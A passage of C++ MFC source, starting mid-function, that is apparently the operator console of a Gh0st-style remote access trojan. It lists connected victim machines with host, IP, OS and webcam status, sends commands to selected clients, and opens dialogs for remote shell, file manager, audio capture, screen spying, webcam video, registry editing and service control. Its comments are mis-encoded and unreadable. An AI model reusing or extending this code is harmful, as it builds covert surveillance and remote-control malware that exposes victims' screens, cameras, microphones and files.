		}
		strOS.Format
			(
			"%s SP%d (Build %d)",
		
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		

		//CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		
		//����
		strPing.Format("%d", LoginInfo->dwSpeed);
		


		strVideo = LoginInfo->bIsWebCam ? "��" : "--";
	
		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);
	
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,pContext);
	}catch(...){}

	return 0;
}



void CRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{

	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); 
	while(pos) 
	{
		int	nItem = m_CList_Online.GetNextSelectedItem(pos);                          
		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); //���б���Ŀ��ȡ��ClientContext�ṹ��
		
		
		// ���ͻ���������б����ݰ�                                                 //�鿴ClientContext�ṹ��
		m_iocpServer->Send(pContext, pData, nSize);      

		
	} 
}



LRESULT CRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//���ﶨ��Զ���ն˵ĶԻ���ת��Զ���ն˵�CShellDlg��Ķ���  �Ȳ鿴�Ի�������ת��OnInitDialog
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);  //�����Ի���

	pContext->m_Dialog[0] = SHELL_DLG;       //��ϢKey
	pContext->m_Dialog[1] = (int)dlg;        //ShellDlg
	return 0;
}



LRESULT CRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());       //�����Ի���
	dlg->ShowWindow(SW_SHOW);                          //��ʾ�Ի���

	pContext->m_Dialog[0] = SYSTEM_DLG;                 //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}



LRESULT CRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	//ת��CFileManagerDlg  ���캯��
	CFileManagerDlg	*dlg = new CFileManagerDlg(this,m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_FILE, GetDesktopWindow());    //������������Dlg    Explorer.exe
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}



LRESULT CRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{


	ClientContext *pContext = (ClientContext *)lParam;
	CVideoDlg	*dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}



LRESULT CRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());      //�����Ի���
	dlg->ShowWindow(SW_SHOW);                      //��ʾ�Ի���

	pContext->m_Dialog[0] = REGEDIT_DLG;              //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}




LRESULT CRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //�����Ի���
	dlg->ShowWindow(SW_SHOW);                      //��ʾ�Ի���

	pContext->m_Dialog[0] = SERVER_DLG;              //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}